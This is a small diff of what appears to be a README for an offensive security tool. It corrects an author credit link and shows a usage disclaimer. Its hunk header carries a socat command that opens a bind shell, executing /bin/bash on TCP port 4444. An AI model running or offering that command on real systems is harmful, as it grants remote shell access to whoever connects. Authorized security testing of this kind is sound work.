@@ -50,4 +50,4 @@ socat -d -d tcp-l:4444,reuseaddr,fork exec:/bin/bash,pty,stderr,setsid,sigint,sa
 This tool is intended for **educational** and **authorized security testing** purposes only. Do not use it on systems you do not own or have explicit permission to test.
 
 ---
-(AndKnownMaly)[https://github.com/andknownmaly]
+Anu by : [AndKnownMaly](https://github.com/andknownmaly)
